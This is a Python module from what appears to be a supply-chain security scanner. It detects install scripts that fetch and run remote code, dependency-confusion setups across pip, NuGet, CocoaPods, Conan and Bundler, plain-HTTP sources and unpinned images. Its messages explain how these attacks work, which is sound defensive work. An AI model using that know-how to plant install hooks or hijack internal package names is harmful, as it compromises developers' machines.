                command = f"node {loader.group('path')}"

            capabilities: list[Capability] = []
            reasons: list[str] = []

            for needle, capability in HOSTILE_IN_LIFECYCLE:
                if needle in command:
                    capabilities.append(capability)
                    reasons.append(f"invokes {needle.strip()!r}")

            if capabilities and ManifestScripts._prints_only(command):
                # A one-liner whose whole effect is a message or an exit. See
                # `INERT_CALL`. The capability it named is real -- `node -e` does
                # evaluate a string -- and what it evaluates is a line of text.
                capabilities = []
                reasons = []

            piped = any(marker in command for marker in PIPE_TO_SHELL)
            if piped:
                capabilities.append(Capability.SPAWN)
                reasons.append("pipes fetched content directly into an interpreter")

            # Case-insensitively, because npm spells one of them `prepublishOnly`.
            install_time = hook.name.lower() in INSTALL_TIME_HOOKS
            if not capabilities:
                if not install_time or ManifestScripts._is_safe_lifecycle(command):
                    continue
                # An install-time script that is not a recognised build step.
                # Reported for existing, rather than for containing a word from
                # a list: `node ./scripts/setup.js` matched no hostile substring
                # and produced nothing, while being the shape most npm
                # compromises actually take. What the referenced file does is a
                # separate question the file detectors answer -- and cannot
                # answer at all if nothing points at it.
                first_party = ManifestScripts._is_first_party(unit.path, ctx)
                vendored = not first_party
                in_tree = (
                    (unit.path,)
                    if hook.kind == "consumerinstall" and unit.path in ctx.install_hook_paths
                    else ManifestScripts._targets_in_tree(
                        command, ctx.install_hook_paths, unit.path
                    )
                )
                # A published package's hook that runs only source files inside the package:
                # those files were scanned in this run with install-time escalation, so a
                # payload in them is already reported as what it is. What runs something
                # opaque -- a binary, an inline `-e` string, a file that is not there -- keeps
                # the dependency grading, because then this finding is all there is.
                readable = bool(in_tree) and all(
                    path.rsplit(".", 1)[-1].lower() in READABLE_HOOK_TARGETS for path in in_tree
                )
                yield self._finding(
                    rule_id="SUSPECT.INSTALL.SCRIPT.001",
                    category=Category.SUSPICIOUS,
                    # Graded by whose manifest it is and what the command reaches.
                    # A dependency's install script is the attack; the project's
                    # own, pointing at a file in the same repository that this scan
                    # has already read, is a fact worth stating once.
                    # And lowered again for an author-time hook, which cannot reach a
                    # consumer installing from a registry tarball. See
                    # `AUTHOR_TIME_HOOKS`.
                    severity=min(
                        (Severity.MEDIUM if readable else Severity.HIGH)
                        if vendored
                        else Severity.LOW
                        if in_tree
                        else Severity.MEDIUM,
                        Severity.MEDIUM
                        if hook.name.lower() in AUTHOR_TIME_HOOKS
                        else Severity.CRITICAL,
                    ),
                    confidence=Confidence.MEDIUM,
                    title=(
                        "Install script in code this project did not write"
                        if vendored
                        else "Install script runs an unrecognised command"
                    ),
                    message=(
                        (
                            f"The {hook.name!r} script runs automatically during install, "
                            f"before any test, review or container boundary applies, and "
                            f"runs {command!r}. This manifest is not the scanned "
                            f"project's own - it is a dependency's, or this is a "
                            f"published package rather than a working tree - so nobody "
                            f"here wrote it and no review here covered it."
                            + (
                                f" It runs {', '.join(in_tree)}, which this scan read as "
                                f"install-time code; anything it does is reported there."
                                if readable
                                else ""
                            )
                        )
                        if vendored
                        else (
                            f"The {hook.name!r} script runs automatically during install "
                            f"and runs {command!r}, which reaches "
                            f"{', '.join(in_tree)} in this repository. That file is "
                            f"tracked, was reviewed when it landed, and has been scanned "
                            f"by every other detector in this run, so this is reported to "
                            f"be recorded rather than because anything is wrong with it. "
                            f"What remains true is that it runs before any test does."
                        )
                        if in_tree
                        else (
                            f"The {hook.name!r} script runs automatically during install, "
                            f"before any test, review or container boundary applies, and "
                            f"runs {command!r} -- which is not a recognised build step "
                            f"and does not resolve to a file in this repository, so "
                            f"nothing here can say what it does."
                        )
                    ),
                    remediation=(
                        "Read the script. If it is a build step, move it behind an "
                        "explicit command a developer chooses to run; if it must run at "
                        "install time, suppress this finding with a justification."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=[],
                    reasons=["runs at install time and is not a recognised build step"],
                )
                continue

            fetch_and_run = Capability.EGRESS in capabilities and (
                piped or Capability.SPAWN in capabilities or Capability.EXECUTE in capabilities
            )

            if fetch_and_run:
                yield self._finding(
                    rule_id="MALWARE.INSTALL.FETCH_EXEC.001",
                    category=Category.MALICIOUS,
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    title="Install script fetches and executes remote content",
                    message=(
                        f"The {hook.name!r} script downloads content and runs it. This "
                        f"executes automatically on every install, as the user, before "
                        f"any test, review or container boundary applies. What runs is "
                        f"whatever the remote host serves at that moment, so it is not "
                        f"pinned by the lockfile and not captured by review."
                    ),
                    remediation=(
                        "Treat the host as compromised. Do not install this package. "
                        "Rotate credentials reachable from the affected machine, "
                        "starting with registry publish tokens."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=capabilities,
                    reasons=reasons,
                )
            else:
                author_time = hook.name.lower() in AUTHOR_TIME_HOOKS
                yield self._finding(
                    rule_id="SUSPECT.INSTALL.SCRIPT.001",
                    category=Category.SUSPICIOUS,
                    # An author-time hook cannot reach a consumer installing from a
                    # registry tarball. See `AUTHOR_TIME_HOOKS`: `unionlabs/union`
                    # declares `prepare: svelte-kit sync` and
                    # `prepack: svelte-kit sync && svelte-package && publint`, and the
                    # `&&` chain is what brought them to this branch rather than the one
                    # above -- so the grading had to be applied in both places.
                    severity=Severity.MEDIUM if author_time else Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    title="Install script performs unexpected operations",
                    message=(
                        f"The {hook.name!r} script runs automatically during "
                        + ("packing or publishing" if author_time else "install")
                        + " and performs operations a build step does not need. "
                        "Install-time code runs as the user with their full environment."
                        + (
                            " This hook runs on the author's machine rather than on a "
                            "consumer's: npm does not fire it for a package installed "
                            "from a registry tarball, which is how every transitive "
                            "dependency arrives. It does fire for a dependency installed "
                            "from a git URL."
                            if author_time
                            else ""
                        )
                    ),
                    remediation=(
                        "Move the work into an explicit build command that a developer "
                        "chooses to run, and review what the script does."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=capabilities,
                    reasons=reasons,
                )

    # -- Dependency sources ----------------------------------------------

    def _source_priority_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """Indexes merged so that the highest version anywhere wins.

        pip given an extra index does not prefer either one: it collects every candidate from every
        index and installs the highest version. With a private index beside PyPI, anyone can
        publish an internal package's name on PyPI at a higher version and it is installed --
        dependency confusion without a typo. Reported when PyPI and another index are merged.

        NuGet the same way: with several package sources and no package source mapping, restore
        takes a package from whichever source answers, so an internal name published on nuget.org
        can be restored in place of the internal package. Microsoft's remedy is source mapping,
        and its absence is what is reported."""
        yield from self._nuget_source_findings(manifest, unit, ctx)
        yield from self._bundler_source_findings(manifest, unit, ctx)
        yield from self._cocoapods_source_findings(manifest, unit, ctx)
        yield from self._conan_remote_findings(manifest, unit, ctx)
        yield from self._helm_repository_findings(manifest, unit, ctx)
        yield from self._base_image_findings(manifest, unit, ctx)
        yield from self._malformed_integrity_findings(manifest, unit, ctx)
        indexes = [
            s.split(" ", 1)[1]
            for s in manifest.sources
            if s.startswith(("index-url ", "extra-index-url "))
        ]
        extra = any(s.startswith("extra-index-url ") for s in manifest.sources)
        public = [i for i in indexes if "pypi.org" in i or "pythonhosted.org" in i]
        private = [i for i in indexes if i not in public]
        if not (extra and public and private):
            return
        from cordon_scanner.core.inventory import DependencySource

        hosts = ", ".join(
            sorted(
                {
                    (DependencySource.sanitise(i) or i).split("/")[2] if "://" in i else i
                    for i in private
                }
            )
        )
        yield self._finding(
            rule_id=SOURCE_PRIORITY_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            title="A private index merged with PyPI",
            message=(
                f"{unit.path} sends pip to PyPI and to {hosts} together. pip installs the highest "
                f"version any index offers, so a name that exists only on the private index can be "
                f"published on PyPI at a higher version and installed in its place."
            ),
            remediation=(
                "Resolve from one index that proxies PyPI, or pin each internal package to its index "
                "(pip's `--index-url` alone, or Poetry/uv/PDM source pinning), and reserve the internal "
                "names on PyPI."
            ),
            unit=unit,
            ctx=ctx,
            detail=hosts,
            capabilities=(),
            reasons=["extra index merged with PyPI"],
        )

    _COMPOSER_BRANCH: ClassVar[re.Pattern[str]] = re.compile(
        r"^(?:dev-[\w./\-]{1,128}|[\w.]{1,64}\.x-dev|[\w.\-]{1,64}-dev)$"
    )

    def _composer_branch_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A Composer constraint that names a branch (`dev-master`, `2.x-dev`), with or without an
        inline alias: what installs is whatever the branch points at when the lock is next
        updated. The lock pins a commit until then; the constraint is what lets it move."""
        if manifest.ecosystem != "composer":
            return
        for declared in manifest.dependencies:
            constraint = declared.spec.split(" as ", 1)[0].strip()
            branch, _, commit = constraint.partition("#")
            if declared.scope is Scope.PLATFORM or not self._COMPOSER_BRANCH.match(branch):
                continue
            if re.fullmatch(r"[0-9a-fA-F]{40}", commit):
                continue  # `dev-main#<full sha>`: pinned to one commit, whatever the branch does
            yield self._finding(
                rule_id=MUTABLE_REF_RULE,
                category=Category.POLICY,
                severity=Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                title="Dependency on a branch that can move",
                message=(
                    f"{declared.name!r} is required as {declared.spec!r}: a branch, which a push "
                    f"re-points. The lock holds one commit until the next `composer update`, which "
                    f"takes whatever the branch has become, unreviewed and outside any release."
                ),
                remediation="Require a tagged release, or pin the commit (`dev-master#<sha>`) until one exists.",
                unit=unit,
                ctx=ctx,
                detail=f"{declared.field_name}.{declared.name} = {declared.spec}",
                capabilities=(),
                reasons=[f"declared in {declared.field_name}", "branch constraint"],
            )

    def _cocoapods_source_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """The public spec repo listed before a private one. CocoaPods searches `source` lines in
        order and takes the first that has the pod, so a private pod's name published on trunk is
        resolved from trunk. Private repos first, trunk last, is the safe order."""
        if manifest.ecosystem != "cocoapods":
            return
        listed = [s.partition(" ")[2] for s in manifest.sources if s.startswith("source ")]
        public = [
            i for i, s in enumerate(listed) if "cdn.cocoapods.org" in s or "CocoaPods/Specs" in s
        ]
        private = [i for i, s in enumerate(listed) if i not in public]
        if not public or not private or min(public) > min(private):
            return
        from cordon_scanner.core.inventory import DependencySource

        named = ", ".join(DependencySource.sanitise(listed[i]) or listed[i] for i in private)
        yield self._finding(
            rule_id=SOURCE_PRIORITY_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            title="Public spec repo searched before a private one",
            message=(
                f"{unit.path} lists the public CocoaPods trunk before {named}. CocoaPods takes a pod "
                f"from the first source that has it, so a private pod's name published on trunk is "
                f"installed in its place."
            ),
            remediation="List the private spec repos first and the public trunk last.",
            unit=unit,
            ctx=ctx,
            detail=named,
            capabilities=(),
            reasons=["public source before private"],
        )

    def _malformed_integrity_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A digest a manifest pins (an image's `@sha256:...`, an archive's checksum) that is not a
        digest of any algorithm: what a lockfile's malformed hash is, written in the manifest. The
        value is never repeated."""
        from cordon_scanner.detect.lockfile import MALFORMED_RULE
        from cordon_scanner.ecosystems.base import Coordinate

        malformed = sorted(
            {
                f"{declared.name}@{declared.spec}" if declared.spec else declared.name
                for declared in manifest.dependencies
                if (Coordinate.integrity(declared.integrity) or "").startswith(Coordinate.MALFORMED)
            }
        )
        if not malformed:
            return
        yield self._finding(
            rule_id=MALFORMED_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.HIGH,
            confidence=Confidence.HIGH,
            title="Lockfile integrity value is not a hash",
            message=(
                f"{len(malformed)} dependenc{'y pins' if len(malformed) == 1 else 'ies pin'} a digest that is not a "
                f"digest of any algorithm: {', '.join(malformed[:10])}. The values are not repeated here."
            ),
            remediation="Pin the digest the registry serves (`docker buildx imagetools inspect`, the registry's own record), and find out what wrote these values.",
            unit=unit,
            ctx=ctx,
            detail=malformed[0].split("@", 1)[0],
            capabilities=(),
            reasons=["a pinned digest that is not one"],
        )

    def _base_image_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A stage built FROM an image named by tag alone. Read from the Dockerfile's stages, so
        `FROM builder` (an earlier stage), `FROM scratch`, `FROM --platform=...` and an image
        built from a global `ARG` are each read for what they are."""
        if manifest.ecosystem != "image":
            return
        for declared in manifest.dependencies:
            if declared.integrity:
                continue
            if declared.field_name.endswith(".image") or declared.field_name.startswith(
                "Kustomization images["
            ):
                yield from self._workload_image_finding(declared, unit, ctx)
                continue
            if not declared.field_name.startswith("FROM "):
                continue
            written = declared.alias or declared.name
            yield self._finding(
                rule_id="POLICY.CONTAINER.UNPINNED_BASE.001",
                category=Category.POLICY,
                severity=Severity.LOW,
                confidence=Confidence.HIGH,
                title="Base image referenced by tag rather than digest",
                message=(
                    f"{written}:{declared.spec} is pinned by tag. A tag is mutable, so two builds of "
                    f"the same Dockerfile can produce different images, and a rebuild can pull "
                    f"content nobody reviewed."
                ),
                remediation="Pin by digest: FROM image:tag@sha256:...",
                unit=unit,
                ctx=ctx,
                detail=written,
                capabilities=(),
                reasons=[f"declared in {declared.field_name}", "no digest"],
            )

    def _workload_image_finding(
        self, declared: DeclaredDependency, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A Kubernetes container (or a Kustomize override) naming its image by tag."""
        written = declared.alias or declared.name
        yield self._finding(
            rule_id="POLICY.CONTAINER.UNPINNED_WORKLOAD_IMAGE.001",
            category=Category.POLICY,
            severity=Severity.LOW,
            confidence=Confidence.HIGH,
            title="Kubernetes workload runs an image by tag rather than digest",
            message=(
                f"{declared.field_name} runs {written}:{declared.spec}, pinned by tag. Each node pulls "
                f"the tag when it schedules the pod, so a re-pushed tag reaches production with no "
                f"change to this manifest."
            ),
            remediation="Pin by digest: image: registry/name:tag@sha256:...",
            unit=unit,
            ctx=ctx,
            detail=f"{declared.field_name}:{written}",
            capabilities=(),
            reasons=[f"declared in {declared.field_name}", "no digest"],
        )

    def _helm_repository_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A chart dependency from a plain-HTTP repository, or with no version at all. Read from
        the chart's dependencies, so the order of `version` and `repository` in an entry does not
        matter -- Helm's own examples put the version first."""
        basename = unit.path.rpartition("/")[2]
        if manifest.ecosystem == "helm" and basename in ("Chart.yaml", "Chart.yml"):
            dependencies = list(manifest.dependencies)
        elif basename == "requirements.yaml":
            # An apiVersion v1 chart's dependencies: Helm's `dependencies:` key, where Ansible's
            # file of the same name holds `roles:` and `collections:`.
            from cordon_scanner.core.datayaml import DataYaml
            from cordon_scanner.ecosystems.helm import ChartFile

            try:
                data = DataYaml.load(unit.content.text, source=unit.path)
            except ValueError:
                return
            listed = data.get("dependencies") if isinstance(data, dict) else None
            if not isinstance(listed, list):
                return
            dependencies = [
                d
                for d in (
                    ChartFile.dependency(e, "dependencies") for e in listed if isinstance(e, dict)
                )
                if d is not None
            ]
        else:
            return
        weak = [
            d.name
            for d in dependencies
            if d.scope is not Scope.PLATFORM
            and not d.spec.startswith("path:")
            and ((d.source or "").startswith("http://") or d.spec.strip() in ("", "*"))
        ]
        if not weak:
            return
        named = ", ".join(sorted(weak))
        yield self._finding(
            rule_id="SUSPECT.HELM.UNTRUSTED_REPOSITORY.001",
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.MEDIUM,
            title="Chart depends on a chart from an unpinned or plain-HTTP repository",
            message=(
                f"{unit.path} pulls {named} over plain HTTP, or with no version at all. Chart "
                f"dependencies are rendered into the manifests applied to the cluster, so whoever "
                f"controls that repository controls what runs."
            ),
            remediation="Use HTTPS, pin each dependency to a version, and prefer a repository the organisation controls or mirrors.",
            unit=unit,
            ctx=ctx,
            detail=named,
            capabilities=(),
            reasons=["unpinned or cleartext chart repository"],
        )

    def _conan_remote_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """ConanCenter listed before a private remote. Conan takes a recipe from the first remote
        that has it, so an internal recipe's name published on ConanCenter is fetched from there."""
        if manifest.ecosystem != "conan":
            return
        listed = [
            s.split(" ")[2] if len(s.split(" ")) > 2 else ""
            for s in manifest.sources
            if s.startswith("remote ")
        ]
        public = [
            i for i, s in enumerate(listed) if re.search(r"(?:^|//)center2?\.conan\.io(?:/|$)", s)
        ]
        private = [i for i, s in enumerate(listed) if i not in public and s]
        if not public or not private or min(public) > min(private):
            return
        from cordon_scanner.core.inventory import DependencySource

        named = ", ".join(DependencySource.sanitise(listed[i]) or listed[i] for i in private)
        yield self._finding(
            rule_id=SOURCE_PRIORITY_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            title="Public remote searched before a private one",
            message=(
                f"{unit.path} lists ConanCenter before {named}. Conan takes a recipe from the first "
                f"remote that has it, so an internal recipe's name published on ConanCenter is "
                f"fetched in its place."
            ),
            remediation="List the private remotes first and ConanCenter last, or pin each internal recipe to its remote.",
            unit=unit,
            ctx=ctx,
            detail=named,
            capabilities=(),
            reasons=["public source before private"],
        )

    def _bundler_source_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """Several global `source` lines in a Gemfile. Bundler resolves a gem not pinned to a
        source block from any of them, and before 2.2.18 took the highest version across all --
        the dependency confusion recorded as CVE-2020-36327. The remedy is one global source and
        a `source ... do` block for the internal gems."""
        if manifest.ecosystem != "rubygems":
            return
        global_sources = [
            s.partition(" ")[2]
            for s in manifest.sources
            if s.startswith("source ") and not s.startswith("source block ")
        ]
        if len(set(global_sources)) < 2:
            return
        from cordon_scanner.core.inventory import DependencySource

        named = ", ".join(sorted({DependencySource.sanitise(s) or s for s in global_sources}))
        yield self._finding(
            rule_id=SOURCE_PRIORITY_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            title="Several global gem sources",
            message=(
                f"{unit.path} declares {len(set(global_sources))} global sources ({named}). A gem not "
                f"scoped to one can be taken from any of them, so an internal gem's name published on "
                f"rubygems.org can be installed in its place."
            ),
            remediation='Keep one global `source`, and require internal gems inside `source "<internal>" do ... end`.',
            unit=unit,
            ctx=ctx,
            detail=named,
            capabilities=(),
            reasons=["several global sources"],
        )

    def _nuget_source_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        if manifest.ecosystem != "nuget":
            return
        sources = [s.partition(": ")[2] for s in manifest.sources if s.startswith("source ")]
        mapped = any(s.startswith("mapping ") for s in manifest.sources)
        public = [s for s in sources if "nuget.org" in s.lower()]
        private = [s for s in sources if s not in public]
        if mapped or not (public and private):
            return
        from cordon_scanner.core.inventory import DependencySource

        named = ", ".join(sorted({(DependencySource.sanitise(s) or s) for s in private}))
        yield self._finding(
            rule_id=SOURCE_PRIORITY_RULE,
            category=Category.SUSPICIOUS,
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            title="Package sources without source mapping",
            message=(
                f"{unit.path} restores from nuget.org and from {named} with no package source "
                f"mapping, so NuGet takes each package from whichever source answers: an internal "
                f"package's name published on nuget.org can be restored in its place."
            ),
            remediation=(
                "Add <packageSourceMapping> routing the internal package prefixes to the internal "
                "source, and reserve the prefix on nuget.org."
            ),
            unit=unit,
            ctx=ctx,
            detail=named,
            capabilities=(),
            reasons=["several sources, no package source mapping"],
        )

    _CLEARTEXT: ClassVar[re.Pattern[str]] = re.compile(r"\bhttp://([^/\s:@]{1,253})", re.IGNORECASE)
    _LOOPBACK: ClassVar[frozenset[str]] = frozenset({"localhost", "127.0.0.1", "[::1]", "::1"})

    def _cleartext_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        """A package source reached over plain HTTP.

        Whoever is on the network path -- a café's Wi-Fi, a compromised proxy, a hostile CI
        network -- can answer for that repository, and the build installs what they serve: the
        index, the metadata and, where no hash is pinned, the artefact itself. Maven 3.8.1 and
        later refuse such repositories by default for exactly this reason; pip, Gradle, Composer
        and older Maven do not. A loopback address never leaves the machine and is not reported.
        """
        seen: set[str] = set()
        for source in manifest.sources:
            match = self._CLEARTEXT.search(source)
            if match is None:
                continue
            host = match.group(1).lower()
            if host in self._LOOPBACK or host in seen:
                continue
            seen.add(host)
            yield self._finding(
                rule_id=CLEARTEXT_SOURCE_RULE,
                category=Category.POLICY,
                severity=Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                title="Package source over plain HTTP",
                message=(
                    f"{unit.path} fetches packages from {host} over plain HTTP. Anyone on the network "
                    f"path can answer for that host, and the build installs what they serve."
                ),
                remediation=f"Use https:// for {host}, or remove the source.",
                unit=unit,
                ctx=ctx,
                detail=host,
                capabilities=(),
                reasons=["package source without TLS"],
            )

    def _source_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        yield from self._source_priority_findings(manifest, unit, ctx)
        yield from self._cleartext_findings(manifest, unit, ctx)
        yield from self._composer_branch_findings(manifest, unit, ctx)
        ecosystem = EcosystemRegistry.get(manifest.ecosystem)
        for declared in manifest.dependencies:
            if not declared.is_non_registry:
                continue
            kind = DeclaredSource.kind(declared.spec, unit.path)
            if kind == "inside":
                # `file:packages/util`, `workspace:*`, `../shared` within this repository: the
                # project's own code, reviewed here as source. Reporting it reported every
                # monorepo's members as packages from outside the registry.
                continue
            if (
                manifest.ecosystem == "image"
                and declared.field_name.startswith("ADD (line")
                and declared.spec.startswith(("http", "git+http"))
            ):
                # `ADD https://...` with no flags: the Dockerfile rule for remote ADD reports this
                # line, and two findings for one download say nothing a second time.
                continue
            locked_inputs = str(getattr(ecosystem, "locked_inputs", None) or "")
            if kind == "mutable" and declared.field_name in getattr(ecosystem, "index_fields", ()):
                # A package index (a Homebrew tap) follows its branch by design: what matters is
                # whose index it is, which the source rule below reports.
                kind = "index"
            if (
                kind == "mutable"
                and locked_inputs
                and declared.field_name.startswith(locked_inputs)
            ):
                # A flake input's ref is the channel `nix flake update` follows; flake.lock, which
                # Nix writes and every build of the flake reads, pins it to a commit and a hash.
                continue
            if kind == "mutable":
                yield self._finding(
                    rule_id=MUTABLE_REF_RULE,
                    category=Category.POLICY,
                    severity=Severity.MEDIUM,
                    confidence=Confidence.CONFIRMED,
                    title="Git dependency on a reference that can move",
                    message=(
                        f"{declared.name!r} is declared as {declared.spec!r}: a branch, a tag or "
                        f"no reference at all, any of which a push can re-point. What installs "
                        f"tomorrow need not be what was reviewed today, and no registry hash, "
                        f"advisory match or release-age delay applies to it."
                    ),
                    remediation="Pin it to a full commit SHA, or depend on a registry release.",
                    unit=unit,
                    ctx=ctx,
                    detail=f"{declared.field_name}.{declared.name} = {declared.spec}",
                    capabilities=(),
                    reasons=[f"declared in {declared.field_name}", "mutable git reference"],
                )
                continue
            # A commit pins a git source; a checksum the declaration records pins an archive the
            # same way -- what is fetched cannot change under the project.
            checksummed = (
                kind == "url"
                and bool(declared.integrity)
                and not (declared.integrity or "").startswith("malformed:")
            )
            pinned = kind == "pinned" or checksummed
            if getattr(ecosystem, "registryless", False):
                # No registry exists to depart from (Nix): every source is a repository or an
                # archive. Plain HTTP is the cleartext rule's to report.
                continue
            if pinned and getattr(ecosystem, "git_distribution", False):
                # Where git is how the ecosystem distributes every package (SwiftPM), a commit
                # pin is its most immutable form, not a departure from a registry.
                continue
            yield self._finding(
                rule_id="POLICY.DEPENDENCY.SOURCE.001",
                category=Category.POLICY,
                severity=Severity.LOW if pinned else Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                title="Dependency resolved from outside the registry",
                message=(
                    f"{declared.name!r} is declared as {declared.spec!r}, which does not "
                    f"resolve from the {manifest.ecosystem} registry"
                    + (
                        ", pinned by its checksum, so it cannot change under the project"
                        if checksummed
                        else ", pinned to a commit, so it cannot change under the project"
                        if pinned
                        else ""
                    )
                    + ". Lockfile integrity hashes, advisory matching and any release-age delay "
                    "apply to registry packages and none of them apply here. The dependency may "
                    "be entirely legitimate; the safety net is simply absent."
                ),
                remediation=(
                    "Publish the package to a registry the organisation controls, or "
                    "vendor it into the repository where it is reviewed like any other "
                    "code."
                ),
                unit=unit,
                ctx=ctx,
                detail=f"{declared.field_name}.{declared.name} = {declared.spec}",
                capabilities=(),
                reasons=[f"declared in {declared.field_name}", "commit-pinned" if pinned else kind],
            )

    # -- Construction ----------------------------------------------------

    def _finding(
        self,
        *,
        rule_id: str,
        category: Category,
        severity: Severity,
        confidence: Confidence,
        title: str,
        message: str,
        remediation: str,
        unit: FileUnit,
        ctx: ScanContext,
        detail: str,
        capabilities: list[Capability] | tuple[Capability, ...],
        reasons: list[str],
    ) -> Finding:
        line = self._line_of(unit, detail)

        if category is not Category.MALICIOUS and SourcePaths.is_test_material_here(unit.path, ctx):
            # The ceiling every other detector applies, arrived at last here because a
            # manifest felt like the one file that is never a fixture. It is: a package
            # manager's own tests need packages to install, so pnpm carries
            # `exec/lifecycle/test/fixtures/*/package.json`, each declaring the install
            # hooks whose runner is under test -- `node -e "console.log('install')"`
            # four times in one manifest. Sixteen HIGH findings, every one of them
            # describing test input for the code that runs install hooks.
            #
            # Still reported, and MALICIOUS is untouched: a fixture tree is where a
            # real payload would most like to sit, and the severity is what changes.
            severity = min(severity, FIXTURE_CEILING)
            message = (
                f"{message} This manifest sits under a path that holds test material, "
                f"where a declared install script is usually input to a test of the "
                f"installer rather than something that ships, so it is reported below "
                f"its usual severity."
            )

        risk = ctx.scorer.score(
            severity,
            confidence,
            ScoringContext(
                # A lifecycle script is install-time by definition; the manifest
                # need not be listed as a hook for that to be true.
                in_install_hook=True,
                capabilities=frozenset(capabilities),
            ),
        )

        return Finding(
            rule_id=rule_id,
            category=category,
            severity=severity,
            confidence=confidence,
            message=message,
            location=Location(path=unit.path, line=line, project=unit.project),
            evidence=Evidence(
                kind=EvidenceKind.METADATA,
                match_hash=Evidence.hash_bytes(detail.encode("utf-8")),
                redaction=RedactionMode.MASKED,
                # Masked because a lifecycle command can embed a token, and a
                # finding must never be the thing that copies one into a log.
                snippet=Redactor.mask(detail[:200]),
            ),
            remediation=remediation,
            explanation=Explanation(
                summary=title,
                matched_rule=rule_id,
                escalations=tuple(reasons),
            ),
            risk=risk,
            detector=self.id,
            capabilities=tuple(dict.fromkeys(capabilities)),
        )

    @staticmethod
    def _line_of(unit: FileUnit, detail: str) -> int | None:
        """Find the line a manifest entry sits on.

        Best effort by design. The parsers work on parsed structures, which
        carry no positions, so the key is located in the raw text afterwards.
        A missing line number is acceptable; a wrong file is not.
        """
        key = detail.split(":", 1)[0].split(" =", 1)[0].strip()
        if not key:
            return None
        needle = f'"{key}"'.encode()
        index = unit.content.raw.find(needle)
        if index == -1:
            index = unit.content.raw.find(key.encode())
        return unit.content.line_of(index) if index != -1 else None

    def _operational(self, path: str, message: str) -> Finding:
        return Finding(
            rule_id="OPERATIONAL.MANIFEST.UNPARSED",
            category=Category.OPERATIONAL,
            # MEDIUM, not INFO. A manifest is the file that decides what runs at
            # install time, so being unable to read one is a coverage hole
            # rather than a note: every lifecycle check, every declared
            # dependency and every install-hook path for this package is
            # unavailable, and the report should not read like a package that
            # was examined and found to declare nothing.
            severity=Severity.MEDIUM,
            confidence=Confidence.CONFIRMED,
            message=message,
            location=Location(path=path),
            evidence=Evidence(
                kind=EvidenceKind.METADATA,
                match_hash=Evidence.hash_bytes(path.encode()),
                redaction=RedactionMode.NONE,
            ),
            remediation="Fix the syntax error so the manifest can be checked.",
            explanation=Explanation(
                summary="A manifest that cannot be parsed is a manifest that was not checked.",
                matched_rule="OPERATIONAL.MANIFEST.UNPARSED",
            ),
            risk=RiskScore(value=0, base=0, confidence_multiplier=1.0),
            detector=self.id,
        )


__all__ = ["ManifestDetector"]
